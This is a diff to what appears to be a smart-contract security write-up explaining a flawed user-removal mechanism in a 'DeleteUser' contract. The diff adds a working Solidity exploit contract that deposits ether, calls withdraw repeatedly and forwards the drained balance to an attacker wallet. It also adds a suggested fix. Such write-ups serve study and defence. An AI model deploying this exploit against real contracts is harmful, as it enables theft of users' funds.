@@ -68,4 +68,23 @@ However, this removal process is flawed due to the following reasons:
 
 The `ExploitDeleteUser` attacker contract takes advantage of this vulnerability by depositing ether into the `DeleteUser` contract, and then calling the `withdraw` function multiple times to steal the ether. By using this approach, the attacker can successfully drain all the ether from the `DeleteUser` contract using just one transaction.
 
+```javascript
+contract ExploitDeleteUser {
+    DeleteUser targetContract;
+    address payable attackerWallet;
+
+    constructor(address _targetContract, address _attackerWallet) payable {
+        targetContract = DeleteUser(_targetContract);
+        attackerWallet = payable(_attackerWallet);
+        targetContract.deposit{value: 2 ether}();
+        targetContract.deposit{value: 1 ether}();
+        targetContract.withdraw(1);
+        targetContract.withdraw(1);
+        uint256 balance = address(this).balance;
+        (bool success, ) = attackerWallet.call{value: balance}("");
+        require(success, "Call to attacker wallet failed");
+    }
+}
+```
+
 To fix this issue, the `DeleteUser` contract should implement a safer mechanism for removing users from the `users` array. This can be achieved by using a mapping to store user balances or by implementing proper checks to avoid duplicate withdrawals.
